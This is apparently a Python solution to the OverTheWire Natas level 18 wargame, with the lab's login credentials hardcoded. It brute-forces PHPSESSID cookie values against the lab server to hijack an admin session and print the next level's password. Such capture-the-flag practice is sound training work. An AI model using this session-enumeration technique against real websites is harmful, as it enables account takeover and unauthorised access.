
import requests
import re
# Credentials
username = 'natas18'
password = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'
url = 'http://natas18.natas.labs.overthewire.org/'

for i in range(1, 641):
    session = requests.Session()
    session.cookies.set('PHPSESSID', str(i))
    
    response = session.get(url, auth=(username, password))
    
    # Check if we are an admin
    if "You are an admin" in response.text:
        match = re.search(r"You are an admin\. The credentials for the next level are:<br><pre>Username: natas19\nPassword: [\w\d]+</pre><div", response.text)
        if match:
            print(match.group(0))
        break
    else:
        print(f"Session ID {i} is not admin.")


